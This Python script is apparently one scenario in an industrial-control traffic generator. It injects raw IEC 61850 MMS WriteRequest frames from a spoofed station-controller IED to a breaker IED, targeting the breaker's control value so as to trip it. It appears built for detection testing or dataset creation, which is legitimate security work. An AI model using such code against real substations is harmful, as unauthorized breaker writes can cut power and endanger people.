#!/usr/bin/env python3
"""
MMS Unauthorized Write Scenario
Generates MMS traffic containing an unauthorized SCADA control write / variable modification request via raw packet injection.
"""

import time
from mms import build_mms_write_request, build_mms_frame, send_frame, MMS_DEFAULT_PORT

def run(endpoints, args):
    target_ied = getattr(args, "target_ied", "IED1_Breaker52A")
    client_ied = getattr(args, "client_ied", "IED5_StationCtrl")
    port = getattr(args, "port", MMS_DEFAULT_PORT)
    interval = getattr(args, "interval", 0.05)
    count = getattr(args, "count", 3)

    server_ep = next((ep for ep in endpoints if ep["ied"] == target_ied and ep["has_server"]), endpoints[0])
    client_ep = next((ep for ep in endpoints if ep["ied"] == client_ied), endpoints[-1])

    target_ip = server_ep["ip"]
    client_ip = client_ep["ip"]
    target_mac = server_ep.get("mac", "00:50:56:01:00:11")
    client_mac = client_ep.get("mac", "00:50:56:01:00:15")

    print(f"Loaded SCD: {server_ep.get('scd_path', 'substation.scd')}")
    print("\nSelected MMS Endpoints:")
    print(f"Source (Client):      {client_ep['ied']} ({client_ip})")
    print(f"Destination (Server): {server_ep['ied']} ({target_ip}:{port})")

    print("\nScenario: MMS Unauthorized SCADA Control Write Request\n")
    print(f"Target Variable:  IED1_Breaker52ACTRL/XCBR1.Pos.Oper.ctlVal (OPEN -> TRIP)")
    print(f"Service Type:     ISO 9506-2 MMS WriteRequest (Tag 0x85)")

    print("\nSending traffic...\n")

    pdu = build_mms_write_request(src_tsel=client_ep["tsel"], dst_tsel=server_ep["tsel"])
    frame = build_mms_frame(
        src_mac=client_mac,
        dst_mac=target_mac,
        src_ip=client_ip,
        dst_ip=target_ip,
        src_port=49152,
        dst_port=port,
        payload=pdu
    )

    for i in range(count):
        sent = send_frame(frame, iface=args.iface)
        status_str = "TX" if sent else "Simulated TX"
        print(f"[{status_str}] {client_ip} -> {target_ip}:{port} (Unauthorized SCADA Write, {len(frame)} bytes)")
        time.sleep(interval)
